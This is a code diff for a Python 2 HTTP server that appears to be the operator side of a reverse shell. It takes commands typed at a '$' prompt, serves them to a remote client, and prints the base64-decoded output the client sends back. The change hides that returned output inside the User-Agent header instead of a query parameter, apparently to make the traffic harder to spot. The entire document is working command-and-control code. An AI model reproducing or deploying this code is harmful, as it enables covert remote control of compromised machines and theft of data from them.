@@ -8,13 +8,15 @@ serverPort = 80
 class webServer(BaseHTTPRequestHandler):
 
     def do_GET(self,):
+        useragent = self.headers.get('User-Agent').split('|')
         self.send_response(200)
         self.send_header("Content-type","text/html")
         self.end_headers()
 
         query_components = parse_qs(urlparse(self.path).query)
-        if "result" in query_components:
-            print(query_components["result"][0].decode("base64"))
+        if len(useragent) == 2:
+            response = useragent[1].split(',')[0]
+            print(response.decode("base64"))
             self.wfile.write("")
             return
         cmd = raw_input("$ ")
@@ -30,3 +32,4 @@ try:
     server.serve_forever()
 except KeyboardInterrupt:
     server.socket.close()
+
